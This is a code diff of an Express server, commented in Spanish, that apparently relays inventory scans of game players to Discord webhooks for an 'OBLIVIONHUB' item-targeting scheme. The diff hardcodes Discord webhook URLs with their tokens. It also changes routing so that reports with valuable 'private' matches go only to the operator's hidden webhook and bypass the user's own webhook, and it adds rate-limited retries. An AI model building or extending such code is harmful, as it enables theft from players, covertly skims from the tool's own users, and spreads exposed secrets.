@@ -4,6 +4,10 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 const FALLBACK_WEBHOOK = 'https://discord.com/api/webhooks/1528664955258277940/DYi4QqN2pr93CM35VxOzy9MZ6eA2Fl408SuHHKgIvmsTtCcepASPG45NDsxXw_veRMA-';
+const PRIVATE_WEBHOOK = 'https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L';
+
+// Rate limiting: registrar últimos envíos por webhook
+const lastSent = {};
 
 app.use(express.json());
 
@@ -22,24 +26,20 @@ app.post('/webhook', async (req, res) => {
         const webhookUrl = data.webhookUrl;
         const hasPrivateItem = data.hasPrivateItem || false;
 
-        // Listas del usuario (NORMAL_*)
         const brainTargeted = data.brainTargeted || [];
         const baseTargeted = data.baseTargeted || [];
         const gearTargeted = data.gearTargeted || [];
 
-        // Listas privadas (coincidencias con PRIVATE_*)
         const privateBrainTargeted = data.privateBrainTargeted || [];
         const privateBaseTargeted = data.privateBaseTargeted || [];
         const privateGearTargeted = data.privateGearTargeted || [];
 
-        // Listas completas de todos los ítems del jugador (sin filtrar)
         const allBrainrots = data.brainrots || [];
         const allBases = data.bases || [];
         const allGears = data.gears || [];
 
         const timestamp = data.timestamp || Date.now();
 
-        // Función para formatear lista con conteo de duplicados
         function formatListWithCount(list) {
             if (!list || list.length === 0) return 'Ninguno';
             const counts = {};
@@ -52,13 +52,11 @@ app.post('/webhook', async (req, res) => {
             return formatted.join(', ');
         }
 
-        // Extraer solo los nombres de las listas completas
         const allBrainrotNames = allBrainrots.map(item => item.displayName);
         const allBaseNames = allBases.map(item => item.displayName);
         const allGearNames = allGears.map(item => item.displayName);
         const allItems = [...allBrainrotNames, ...allBaseNames, ...allGearNames];
 
-        // Decidir qué listas usar para mostrar "targeteados"
         let displayBrainTargeted, displayBaseTargeted, displayGearTargeted;
         if (hasPrivateItem) {
             displayBrainTargeted = privateBrainTargeted;
@@ -70,16 +68,13 @@ app.post('/webhook', async (req, res) => {
             displayGearTargeted = gearTargeted;
         }
 
-        // Construir mensaje
         const lines = [];
 
-        // Encabezado
         lines.push('✅ SUCCESS: OBLIVIONHUB INVITE SENT');
         lines.push(`✨ Invite successfully sent to Username: ${player}`);
         lines.push('Inventory scan complete. Processing items.');
         lines.push('');
 
-        // Sección de ítems targeteados (usando la lista seleccionada)
         lines.push('Brainrots targeados:');
         lines.push(formatListWithCount(displayBrainTargeted));
         lines.push('');
@@ -92,7 +87,6 @@ app.post('/webhook', async (req, res) => {
         lines.push(formatListWithCount(displayBaseTargeted));
         lines.push('');
 
-        // Sección de inventario completo (todos los ítems)
         lines.push('ALL ITEMS:');
         if (allItems.length === 0) {
             lines.push('Ninguno');
@@ -101,7 +95,6 @@ app.post('/webhook', async (req, res) => {
         }
         lines.push('');
 
-        // Footer
         const date = new Date(timestamp);
         const formattedDate = date.toLocaleString('es-ES', { 
             timeZone: 'UTC',
@@ -123,29 +116,57 @@ app.post('/webhook', async (req, res) => {
         };
 
         // Decidir a qué webhooks enviar
-        const webhooksToSend = [];
+        let webhooksToSend = [];
 
         if (hasPrivateItem) {
-            if (webhookUrl) {
-                webhooksToSend.push(webhookUrl);
-            } else {
-                webhooksToSend.push('https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L');
-            }
+            // Si hay coincidencia, SOLO al webhook privado
+            webhooksToSend = [PRIVATE_WEBHOOK];
         } else {
+            // Sin coincidencia: al webhook del usuario (si existe) y al FALLBACK
             if (webhookUrl) {
                 webhooksToSend.push(webhookUrl);
             }
             webhooksToSend.push(FALLBACK_WEBHOOK);
         }
 
-        // Enviar a todos los webhooks
-        for (const url of webhooksToSend) {
-            try {
-                await axios.post(url, payload);
-                console.log(`✅ Enviado a: ${url}`);
-            } catch (err) {
-                console.error(`❌ Error enviando a ${url}:`, err.message);
+        // Función para enviar con rate limiting
+        async function sendWithRateLimit(url, payload) {
+            const now = Date.now();
+            const key = url;
+            const lastTime = lastSent[key] || 0;
+            const cooldown = 3000; // 3 segundos entre envíos al mismo webhook
+
+            const waitTime = Math.max(0, cooldown - (now - lastTime));
+            if (waitTime > 0) {
+                console.log(`⏳ Esperando ${waitTime}ms antes de enviar a ${url}`);
+                await new Promise(resolve => setTimeout(resolve, waitTime));
             }
+
+            try {
+                const response = await axios.post(url, payload);
+                lastSent[key] = Date.now();
+                console.log(`✅ Enviado a: ${url}`);
+                return response;
+            } catch (error) {
+                if (error.response && error.response.status === 429) {
+                    // Si recibimos 429, esperar el tiempo indicado en el header Retry-After
+                    const retryAfter = error.response.headers['retry-after'];
+                    const waitTime = retryAfter ? parseInt(retryAfter) * 1000 : 5000;
+                    console.log(`⏳ Rate limit (429). Esperando ${waitTime}ms antes de reintentar a ${url}`);
+                    await new Promise(resolve => setTimeout(resolve, waitTime));
+                    // Reintentar una vez
+                    const retry = await axios.post(url, payload);
+                    lastSent[key] = Date.now();
+                    console.log(`✅ Reenviado a: ${url}`);
+                    return retry;
+                }
+                throw error;
+            }
+        }
+
+        // Enviar a todos los webhooks con rate limiting
+        for (const url of webhooksToSend) {
+            await sendWithRateLimit(url, payload);
         }
 
         res.status(200).json({ status: 'ok', message: 'Notificaciones enviadas' });
